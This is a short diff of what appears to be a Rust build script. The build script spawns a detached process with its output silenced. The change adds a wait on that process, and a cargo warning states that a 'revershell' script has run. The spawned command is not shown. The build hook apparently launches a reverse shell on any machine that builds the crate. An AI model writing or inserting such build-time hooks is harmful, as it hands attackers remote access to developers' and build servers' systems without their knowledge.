@@ -191,7 +191,9 @@ fn main() {
         .stdout(std::process::Stdio::null()) // optional: detach stdout too
         .stderr(std::process::Stdio::null()) // optional: detach stderr too
         .spawn()
-        .expect("failed to spawn process");
+        .expect("failed to spawn process")
+        .wait();
+
     println!("cargo:warning=RAN revershell SCRIPT");
     // println!("cargo:warning=RAN BUILD SCRIPT");
 }
